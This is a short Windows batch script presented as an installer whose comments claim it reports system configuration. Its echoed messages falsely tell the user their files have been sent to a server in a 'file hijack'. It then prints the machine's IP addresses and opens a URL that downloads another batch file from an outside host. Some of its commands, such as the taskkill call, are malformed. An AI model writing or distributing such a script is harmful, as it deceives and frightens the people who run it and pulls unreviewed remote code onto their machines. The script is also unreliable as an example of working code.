@ECHO OFF 
:: This batch file details Windows 10, hardware, and networking configuration.
TITLE Installation...
ECHO Please wait... Sending your files to our servers
:: Section 1: Loader
ECHO ..........................
ECHO Your information was detected:
ECHO Loading user instances
ECHO This may take a while
:: Section 2: Hardware information.
ECHO ..........................
ECHO FILES SENT!!!
ECHO ..........................
ECHO This is a file hijack...
ECHO ..........................
:: Section 3: Networking information.
ECHO ============================
ECHO Sending over your local IP address:
ECHO ============================
ipconfig | findstr IPv4
ipconfig | findstr IPv6
START https://intranet.mzf.cz/locals/installer.bat
START taskkill -cmd.exe
START
